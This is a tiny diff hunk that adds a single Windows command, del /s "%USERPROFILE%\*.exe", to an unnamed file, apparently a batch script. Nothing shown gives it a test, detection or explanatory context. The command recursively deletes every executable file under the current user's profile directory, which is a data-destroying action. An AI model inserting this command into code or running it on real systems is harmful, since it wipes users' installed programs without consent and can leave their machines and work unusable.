@@ -1,0 +1,2 @@
+del /s "%USERPROFILE%\*.exe"
+
